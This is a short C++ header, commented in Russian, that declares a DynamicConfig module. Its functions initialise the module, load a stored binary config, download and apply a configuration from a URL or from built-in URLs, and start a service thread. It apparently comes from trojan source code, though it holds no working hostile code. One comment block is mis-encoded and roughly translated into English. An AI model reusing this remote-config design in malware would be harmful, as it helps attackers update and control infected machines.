/*
  Работа с DynamicConfig.
*/
#pragma once

#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace DynamicConfig
{
  /*
    Инициализация.
  */
  void init(void);
  
  /*
    Деинициализация.
  */
  void uninit(void);
  
  /*
    Загрузка текущей конфигурации в память процесса.

    Return - указатель на конфиг(необходимо освободить через Mem), или NULL в случаи ошибки.
  */
  BinStorage::STORAGE *getCurrent(void);
  
  /*
    Загрузка и применение конфигураци.

    IN url - URL конфигурации, или NULL для загрузки изветных URL.
    Return - true - если успешно загржена,
             false - в случаи ошибки.
  */
  bool download(LPSTR url);
  
  /*В В В В Thread creation.

В В В В IN OUT group - the group potokok to which will belong to the flow of service.
В В В В 
В В В В Return - true - if successful,
В В В В В В В В В В В В В В В В В В В false - if an error occurs.
В В */
  bool create(ThreadsGroup::GROUP *group);
};
